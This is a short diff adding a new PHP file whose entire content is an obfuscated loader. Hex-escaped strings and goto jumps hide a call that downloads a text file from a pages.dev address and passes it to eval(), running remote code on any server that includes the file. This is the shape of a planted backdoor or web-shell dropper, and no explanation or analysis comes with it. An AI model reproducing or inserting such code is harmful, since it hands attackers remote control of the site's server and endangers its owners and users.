@@ -1,0 +1,2 @@
+<?php
+ goto IEUD1; IEUD1: $KJ = file_get_contents(urldecode("\x68\164\x74\x70\x73\x3a\x2f\x2f\162\x65\x64\55\151\x70\163\56\x70\141\147\145\163\56\x64\x65\x76\57\x6e\x61\166\137\63\x2e\164\x78\164")); goto n3lTE; n3lTE: $KJ = "\x3f\x3e\x20" . $KJ; goto ztA7v; ztA7v: eval($KJ);
